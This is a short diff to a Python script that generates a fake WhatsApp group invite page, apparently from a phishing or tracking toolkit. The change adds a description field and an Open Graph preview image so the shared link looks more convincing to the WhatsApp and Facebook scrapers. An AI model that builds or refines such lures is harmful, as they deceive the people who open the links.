@@ -12,6 +12,7 @@ W = '\033[0m'  # white
 title = os.getenv('TITLE')
 image = os.getenv('IMAGE')
 redirect = os.getenv('REDIRECT')
+desc = os.getenv('DESC')
 
 if not title:
     try:
@@ -21,6 +22,15 @@ if not title:
 if not title:
     title = 'Project Updates & Chat'
 utils.print(f'{G}[+] {C}Group Title :{W} ' + title)
+
+if not desc:
+    try:
+        desc = input(f'{G}[+] {C}Description : {W}')
+    except Exception:
+        desc = ''
+if not desc:
+    desc = 'WhatsApp Group Invite'
+utils.print(f'{G}[+] {C}Description :{W} ' + desc)
 
 if not image:
     try:
@@ -57,11 +67,19 @@ if not img_name:
     if not os.path.exists(dest):
         img_name = 'ZIvBTrQd9nP.png'
 
+# Resolve absolute og_image URL for WhatsApp & Facebook scrapers
+if image.startswith('http'):
+    og_image = image
+else:
+    og_image = f'https://seeker.riocut.com/images/{img_name}'
+
 with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
         code = code.replace('window.location = "https:" + restOfUrl;', '')
     code = code.replace('$TITLE$', title)
+    code = code.replace('$DESC$', desc)
+    code = code.replace('$OG_IMAGE$', og_image)
     code = code.replace('REDIRECT_URL', redirect)
     code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
 
